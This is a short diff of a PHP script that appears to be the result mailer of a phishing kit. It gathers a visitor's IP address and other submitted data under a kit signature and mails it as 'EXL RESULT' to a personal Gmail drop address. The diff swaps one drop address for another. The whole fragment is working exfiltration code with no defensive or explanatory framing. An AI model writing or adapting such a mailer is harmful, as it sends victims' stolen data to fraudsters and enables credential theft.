@@ -8,7 +8,7 @@ $message .= "$ip \n";
 $message .= "------------KaPeLa --------------\n";
 
 
-$recipient = "zigziglar9@gmail.com,";
+$recipient = "carpalice21@gmail.com,";
 $subject = "EXL RESULT";
 $headers .= "MIME-Version: 1.0\n";
 mail($recipient,$subject,$message,$headers);
